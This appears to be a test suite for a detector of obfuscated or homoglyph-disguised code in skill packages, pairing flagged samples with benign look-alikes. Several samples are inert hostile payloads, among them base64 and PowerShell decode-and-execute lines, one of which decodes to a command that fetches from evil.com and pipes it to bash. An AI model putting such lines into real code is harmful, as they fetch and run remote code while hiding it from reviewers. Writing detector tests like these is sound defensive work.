/**
 * Tests for the obfuscation / hidden-character detector module.
 *
 * Each ADDED rule gets a positive case (the attack fires the expected
 * type+severity) and a benign negative (a look-alike that MUST stay clean —
 * false positives turn the LOCKED scorer's verdict suspicious/malicious and
 * break the demo). All payload strings here are INERT DATA, never executed.
 *
 * We drive through the real `prefilter()` composition root so we exercise the
 * exact wiring (line splitting, dedupe, quote/line metadata) the product ships.
 */

import { describe, it, expect } from 'vitest';
import type { RawSkill, SkillFile } from '@jenz/shared';
import { prefilter } from '../prefilter';

/** Build a RawSkill from a map of path → content. */
function skill(files: Record<string, string>): RawSkill {
  const skillFiles: SkillFile[] = Object.entries(files).map(([path, content]) => ({ path, content }));
  return { slug: 'obfusc-fixture', name: 'Obfusc Fixture', files: skillFiles, source: 'inline' };
}

/** True iff any finding of the given type+severity was emitted. */
function has(raw: RawSkill, type: string, severity?: string): boolean {
  return prefilter(raw).some((f) => f.type === type && (severity === undefined || f.severity === severity));
}

describe('obfusc rules — base64 decode-AND-execute', () => {
  it('flags JS eval(atob(...)) as obfuscation high', () => {
    const raw = skill({ 'a.js': "eval(atob('Y3VybCBldmlsLmNvbSB8IGJhc2g='))\n" });
    expect(has(raw, 'obfuscation', 'high')).toBe(true);
  });

  it('flags JS new Function(atob(x)) as obfuscation high', () => {
    const raw = skill({ 'a.js': 'new Function(atob(payload))()\n' });
    expect(has(raw, 'obfuscation', 'high')).toBe(true);
  });

  it('flags JS exec(Buffer.from(<b64>,"base64").toString()) as obfuscation high', () => {
    const raw = skill({ 'a.js': "exec(Buffer.from('Y3VybA==','base64').toString())\n" });
    expect(has(raw, 'obfuscation', 'high')).toBe(true);
  });

  it('flags Python exec(base64.b64decode(...)) as obfuscation high', () => {
    const raw = skill({ 'a.py': "exec(base64.b64decode('aW1wb3J0IG9z'))\n" });
    expect(has(raw, 'obfuscation', 'high')).toBe(true);
  });

  it('flags Python os.system(b64decode(x)) as obfuscation high', () => {
    const raw = skill({ 'a.py': 'os.system(b64decode(blob))\n' });
    expect(has(raw, 'obfuscation', 'high')).toBe(true);
  });

  it('flags PowerShell [Convert]::FromBase64String piped to IEX as obfuscation high', () => {
    const raw = skill({
      'a.ps1': 'IEX ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b)))\n',
    });
    expect(has(raw, 'obfuscation', 'high')).toBe(true);
  });

  it('flags powershell -EncodedCommand <blob> as obfuscation high', () => {
    const raw = skill({ 'a.ps1': 'powershell.exe -EncodedCommand SQBFAFgAIAAoAGcAZQB0AC0AZABhAHQAYQAp\n' });
    expect(has(raw, 'obfuscation', 'high')).toBe(true);
  });

  it('flags macOS base64 -D piped to a shell as obfuscation high', () => {
    const raw = skill({ 'a.sh': "printf 'Y3VybCBldmlsLmNvbQ==' | base64 -D | bash\n" });
    expect(has(raw, 'obfuscation', 'high')).toBe(true);
  });

  // ── benign negatives: encoded blobs with NO decode+execute ──

  it('BENIGN: a markdown data URI (bare base64, no decode/exec) does NOT flag', () => {
    const raw = skill({
      'README.md':
        '![logo](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAC0lEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==)\n',
    });
    expect(prefilter(raw)).toEqual([]);
  });

  it('BENIGN: a base64 env/config value (no decode/exec) does NOT flag', () => {
    const raw = skill({ '.env.example': 'SECRET_B64=aGVsbG8gd29ybGQ=\n' });
    expect(prefilter(raw)).toEqual([]);
  });

  it('BENIGN: documenting `atob` in prose (no eval/Function) does NOT flag', () => {
    const raw = skill({ 'SKILL.md': 'Use atob() in the browser to decode the response body.\n' });
    expect(has(raw, 'obfuscation')).toBe(false);
  });
});

describe('obfusc rules — char-code / escape-run construction', () => {
  it('flags String.fromCharCode(<many ints>) as obfuscation medium', () => {
    const raw = skill({ 'a.js': 'const c = String.fromCharCode(99,117,114,108)\n' });
    expect(has(raw, 'obfuscation', 'medium')).toBe(true);
  });

  it('flags a ".join(chr(...))" python construction as obfuscation medium', () => {
    const raw = skill({ 'a.py': "cmd = ''.join(chr(c) for c in [99,117,114,108])\n" });
    expect(has(raw, 'obfuscation', 'medium')).toBe(true);
  });

  it('flags chr(..)+chr(..)+chr(..) concatenation as obfuscation medium', () => {
    const raw = skill({ 'a.py': 's = chr(99)+chr(117)+chr(114)+chr(108)\n' });
    expect(has(raw, 'obfuscation', 'medium')).toBe(true);
  });

  it('flags a long \\uXXXX escape run as obfuscation medium', () => {
    const raw = skill({ 'a.js': 'const s = "\\u0063\\u0075\\u0072\\u006c"\n' });
    expect(has(raw, 'obfuscation', 'medium')).toBe(true);
  });

  it('flags a long octal \\NNN escape run as obfuscation medium', () => {
    const raw = skill({ 'a.py': 's = "\\143\\165\\162\\154"\n' });
    expect(has(raw, 'obfuscation', 'medium')).toBe(true);
  });

  // ── benign negatives ──

  it('BENIGN: a single String.fromCharCode(10) does NOT flag', () => {
    const raw = skill({ 'a.js': 'const newline = String.fromCharCode(10)\n' });
    expect(has(raw, 'obfuscation')).toBe(false);
  });

  it('BENIGN: const s = String(x) does NOT flag', () => {
    const raw = skill({ 'a.js': 'const s = String(x)\n' });
    expect(has(raw, 'obfuscation')).toBe(false);
  });

  it('BENIGN: prose mentioning `chr` does NOT flag', () => {
    const raw = skill({ 'SKILL.md': 'The chr function converts a code point to a character.\n' });
    expect(has(raw, 'obfuscation')).toBe(false);
  });

  it('BENIGN: a plain hex string / git SHA does NOT flag', () => {
    const raw = skill({ 'NOTES.md': 'See commit a1b2c3d4e5f6 for the fix.\n' });
    expect(prefilter(raw)).toEqual([]);
  });

  it('BENIGN: a hex CSS colour does NOT flag', () => {
    const raw = skill({ 'styles.md': 'Set color: #ff00aa for the accent.\n' });
    expect(prefilter(raw)).toEqual([]);
  });
});

describe('obfusc rules — dangerous-token concatenation', () => {
  it('flags "cu"+"rl" assembling curl as obfuscation medium', () => {
    const raw = skill({ 'a.js': 'const cmd = "cu" + "rl"\n' });
    expect(has(raw, 'obfuscation', 'medium')).toBe(true);
  });

  it('flags "ba"+"sh" assembling bash as obfuscation medium', () => {
    const raw = skill({ 'a.py': "shell = 'ba' + 'sh'\n" });
    expect(has(raw, 'obfuscation', 'medium')).toBe(true);
  });

  it('flags "/bin/" + "sh" assembling /bin/sh as obfuscation medium', () => {
    const raw = skill({ 'a.js': 'const p = "/bin/" + "sh"\n' });
    expect(has(raw, 'obfuscation', 'medium')).toBe(true);
  });

  // ── benign negatives ──

  it('BENIGN: arbitrary "a" + "b" string concat does NOT flag', () => {
    const raw = skill({ 'a.js': 'const greeting = "Hello, " + "world"\n' });
    expect(has(raw, 'obfuscation')).toBe(false);
  });

  it('BENIGN: a literal `curl ... | bash` install line does NOT flag as obfuscation (no concat)', () => {
    const raw = skill({ 'deploy.sh': 'curl -fsSL https://example.com/install.sh | bash\n' });
    expect(has(raw, 'obfuscation')).toBe(false);
  });
});

describe('obfusc rules — homoglyph / mixed-script', () => {
  it('flags a Latin/Cyrillic mixed-script token as hidden-unicode medium', () => {
    // "curl" with a Cyrillic "с" (U+0441) swapped for the ASCII "c".
    const raw = skill({ 'a.sh': 'run сurl https://evil.example\n' });
    expect(has(raw, 'hidden-unicode', 'medium')).toBe(true);
  });

  it('flags a Latin/Greek mixed-script token as hidden-unicode medium', () => {
    // "bash" with a Greek "α" (U+03B1) where an "a" would be.
    const raw = skill({ 'a.sh': 'invoke bαsh now\n' });
    expect(has(raw, 'hidden-unicode', 'medium')).toBe(true);
  });

  // ── benign negatives: Latin Extended (Norwegian/accented) is NOT a homoglyph ──

  it('BENIGN: Norwegian text (æøå) does NOT flag hidden-unicode', () => {
    const raw = skill({ 'SKILL.md': 'Blåbærsyltetøy er godt på brød.\n' });
    expect(has(raw, 'hidden-unicode')).toBe(false);
  });

  it('BENIGN: accented French/Latin text (é) does NOT flag hidden-unicode', () => {
    const raw = skill({ 'SKILL.md': 'Functionalité activée.\n' });
    expect(has(raw, 'hidden-unicode')).toBe(false);
  });

  it('BENIGN: pure-Cyrillic prose (single script) does NOT flag hidden-unicode', () => {
    // No ASCII-Latin co-occurring inside any word → not a disguise.
    const raw = skill({ 'SKILL.md': 'Привет мир\n' });
    expect(has(raw, 'hidden-unicode')).toBe(false);
  });
});
